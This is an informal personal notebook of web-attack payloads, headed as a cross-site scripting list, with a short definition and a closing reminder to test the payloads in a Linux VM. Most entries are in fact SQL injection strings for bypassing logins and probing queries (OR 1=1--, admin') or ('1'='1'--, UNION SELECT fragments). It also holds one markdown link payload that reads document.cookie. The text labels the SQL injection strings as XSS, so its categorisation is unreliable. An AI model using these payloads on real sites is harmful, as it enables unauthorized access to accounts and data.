NOTEBOOK sorta, slightly unorganized, catagorized but could be neater.

"-" is a makeshift bulletpoint, not apart of whats typed after. eg 

-  'lol = "'lol" 
  
and not =/=

"-  'lol"

#Cross Site Scripting

Cross Site Scripting (XSS) attacks are a type of injectoin, in which scripts are injected into an otherwise 
trusted and reputable website.

Some I like to give a crack are;

XSS in HTML/Applications

- ' or '
- OR "" = "
- '=0--+
- 'LIKE'
- - ' AND id IS NULL; --
- '''''''''''''UNION SELECT '2


Bypass word blacklist with code evaluation

- OR 1=1
- OR 1=1-- 
- OR 3409=3409 AND ('pytW' LIKE 'pytW
- %' AND 8310=8310 AND '%'='
- AND 1=1 AND '%'='


[a](javascript:prompt(document.cookie))

- admin') or ('1'='1'--
- or true--
- admin') or ('1'='1'#
- ' or ''&'
- admin') or ('1'='1'/
 
 
Ordre and Union based palloads

  Open Linux VM and check which ones had the most promising outcomes based on previous use cases Novemeber calvin
